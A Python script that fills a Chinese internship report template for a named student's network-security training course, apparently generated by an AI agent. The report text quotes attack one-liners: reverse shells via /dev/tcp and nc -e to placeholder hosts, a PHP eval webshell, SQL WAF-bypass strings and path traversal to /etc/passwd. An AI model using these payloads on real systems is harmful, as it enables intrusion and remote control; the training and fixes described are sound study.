#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""为张子繁填写实习报告模板"""

from docx import Document
from docx.shared import Pt

template_path = '/root/.openclaw/media/qqbot/downloads/1905229424/17911036127897E831347AF9570D93DF/85d44bfe-5764-4683-959f-b534932c42df.docx'
output_path = '/opt/Class01/项目/网络安全实践-2实习报告-张子繁.docx'

doc = Document(template_path)
table = doc.tables[0]
cell = table.rows[0].cells[0]

# ============ 实习主要内容（P7-P25） ============
main_lines = [
    "实训以 Kali Linux 为基础平台，以 Flask Web 用户管理系统为实训项目，从攻防双视角系统性地开展了以下实训内容：",
    "",
    "0x01 Kali 操作系统初始化：完成 Kali Linux 2026 的安装与系统初始化配置，包括系统更新、网络配置、中文环境设置、基础工具链（git、curl、wget、python3 等）安装，建立标准化的渗透测试工作环境。",
    "",
    "0x02 AI 系统安装：部署 OpenClaw AI Agent 系统，完成基础配置与插件安装，建立 AI 辅助安全分析的工作环境，为后续自动化漏洞分析和报告撰写奠定基础。",
    "",
    "0x03 OpenClaw 安装对接 QQ Bot：完成了 OpenClaw AI Agent 与 QQ Bot 通道的对接配置，实现了通过 QQ 与 AI Agent 实时交互的能力，包括消息接收、命令执行、结果反馈等功能的调试与验证。",
    "",
    "0x04 密码安全：系统学习了密码安全相关知识，包括：0x01 常见部署系统默认用户密码（路由器、数据库、中间件等默认账号密码梳理）；0x02 用户名密码泄露（泄露途径分析：数据库注入、日志泄漏、社工库等；密码保护策略）；0x03 TOP7 CVE-2026-40910 frp 漏洞（frp 内网穿透工具的最新高危漏洞分析与利用）；0x04 Burp Suite 安装（Kali 下 Burp Suite Community/Professional 的安装配置过程）；0x05 代理设置（Burp Suite 代理监听配置、浏览器代理设置、HTTPS 证书导入）；0x06 BP 进行字典攻击（使用 Burp Suite Intruder 模块搭配密码字典对登录接口进行暴力破解攻击实验）。",
    "",
    "0x05 文件上传实验：在实训项目中测试了文件上传功能的安全性，发现存在路径穿越漏洞（可通过 ../../ 上传到任意目录）和 Content-Type 绕过漏洞（修改请求头即可上传任意恶意文件）。修复方案：使用 werkzeug.secure_filename() 处理文件名、新增文件魔数（Magic Number）校验验证真实文件类型、限制上传文件大小。",
    "",
    "0x06 越权：在实训项目中测试了用户权限控制的有效性，发现存在垂直越权（未登录可直接访问需要认证的页面）和水平越权（可访问其他用户的个人信息）两类漏洞。修复方案：新增 login_required 装饰器统一认证管理、在个人中心等页面校验当前用户仅能操作自己的数据。",
    "",
    "0x07 绕过：以 SQLi-LABS 靶场为实验环境，开展了 WAF 绕过 Fuzz 测试，掌握了多种绕过技术：注释符绕过（/**/）、大小写混淆（UnIoN SeLeCt）、双写绕过（UNUNIONION）、编码绕过（URL 编码、Unicode 编码）等技巧，深入理解了 WAF 检测规则与绕过思路。",
    "",
    "0x08 文件包含：在实训项目中测试了 /page 路由的文件读取功能，发现存在本地文件包含漏洞，可通过 ../ 路径穿越读取系统文件（/etc/passwd 等）。修复方案：使用 os.path.normpath + os.path.realpath 双重路径解析、校验文件路径严格在 pages 目录下、对读取内容做 HTML 转义同时防御 XSS。",
    "",
    "0x09 CSRF 漏洞：在实训项目中测试了跨站请求伪造攻击，所有需要认证的 POST 操作均未携带 CSRF Token，攻击者可构造恶意页面诱导用户触发操作。修复方案：使用 Flask-WTF 的 CSRFProtect 中间件全局启用 CSRF 保护、所有表单添加隐藏的 csrf_token 字段。",
    "",
    "0x10 NPS 客户端配置：学习了 NPS（内网穿透工具）的客户端配置方法，包括服务端地址配置、密钥验证、隧道协议选择（TCP/UDP/HTTP）、客户端启动与状态监控等，实现了从外网访问内网服务的能力。",
    "",
    "0x11 Linux 常见利用手法：学习了 Linux 系统层面的渗透测试技术，包括：SUID 提权（查找 SUID 文件、利用漏洞程序）、计划任务利用（检查 cron 配置、修改可写脚本）、sudo 配置错误（sudo -l 查看权限、利用配置不当的命令）、内核漏洞提权等常见手法。",
    "",
    "0x12 PHP 反弹 Shell 木马使用：编写了 PHP 一句话木马（如 eval($_POST['cmd']) 类型），结合反向 Shell 实现 WebShell 管理，掌握了文件上传漏洞与命令执行组合利用的完整攻击链。",
    "",
    "0x13 Shell 反弹手法：掌握了多种反向 Shell 的构造方式：bash 反弹（bash -i >& /dev/tcp/IP/PORT 0>&1）、nc 反弹（nc -e /bin/sh IP PORT）、Python 反弹（socket + subprocess 实现）、PHP 反弹（fsockopen + exec 实现），理解了正向连接与反向连接的不同应用场景及防火墙穿透原理。",
]

for i, text in enumerate(main_lines):
    idx = 7 + i
    p = cell.paragraphs[idx]
    for run in list(p.runs):
        run.text = ''
    if text:
        run = p.add_run(text)
        run.font.size = Pt(12)
        run.font.name = '宋体'

# ============ 实习总结（P27-P63） ============
summary_lines = [
    "通过本次为期九天的网络安全实训，我从 Kali Linux 基础操作到 Web 安全漏洞深度修复，系统性地构建了完整的网络安全知识体系。本次实训内容涵盖了从底层系统操作到上层 Web 应用安全的全链路技术栈，包括 0x01 Kali 系统初始化、0x02 AI 系统安装、0x03 OpenClaw+QQBot 对接、0x04 密码安全与暴力破解（含 Burp Suite 安装配置、代理设置、字典攻击、frp 漏洞分析）、0x05 文件上传漏洞、0x06 越权漏洞、0x07 WAF 绕过、0x08 文件包含、0x09 CSRF 漏洞、0x10 NPS 内网穿透、0x11 Linux 利用手法、0x12 PHP 反弹木马、0x13 Shell 反弹手法共 13 个实训模块。",
    "在实训项目的安全加固实践中，我将上述安全知识转化为具体的漏洞修复行动，完成了 Flask 用户管理系统从初始版本到全面安全加固的完整演进，累计修复了 SQL 注入、越权、CSRF、文件上传绕过、文件包含、XSS、SSRF、SSTI 模板注入、命令注入等 9 大类安全漏洞，共计完成 20 次 Git 提交，生成 8 份 Word 格式的独立漏洞修复报告存档于 GitHub 仓库。",
    "在工具使用方面，熟练掌握了安全从业人员必备的核心技能：Kali Linux 作为渗透测试基础平台、Burp Suite 进行 HTTP 流量分析拦截与字典攻击、OpenClaw AI Agent 辅助漏洞分析报告生成、Git 进行版本管理与协同开发。特别是在 Burp Suite 的使用上，完成了从安装配置、代理设置到 Intruder 模块字典攻击的完整实战链路。",
    "本次实训的另一重要收获是内网渗透与系统利用能力的建立。通过 NPS 客户端配置掌握了内网穿透隧道建立方法；通过 Linux 常见利用手法学习了 SUID 提权、计划任务利用、sudo 配置错误等系统层面攻击技术；通过 PHP 反弹木马和多种 Shell 反弹手法掌握了远程控制与权限维持的核心技能。这些进阶内容让我对网络安全的理解从 Web 层深入到了系统层和网络层。",
    "实训最大的收获是安全思维的建立。从 SQL 注入到命令注入，从越权到 CSRF，每一个漏洞的修复都让我更深刻地理解：安全不是某个独立的功能模块，而是贯穿开发全生命周期的持续过程。从攻击者视角理解漏洞利用，从防御者视角设计修复方案——这种双向思维将伴随我未来的技术成长。",
]

for i, text in enumerate(summary_lines):
    idx = 27 + i
    p = cell.paragraphs[idx]
    for run in list(p.runs):
        run.text = ''
    if text:
        run = p.add_run(text)
        run.font.size = Pt(12)
        run.font.name = '宋体'

doc.save(output_path)
print(f'✅ 完成: {output_path}')
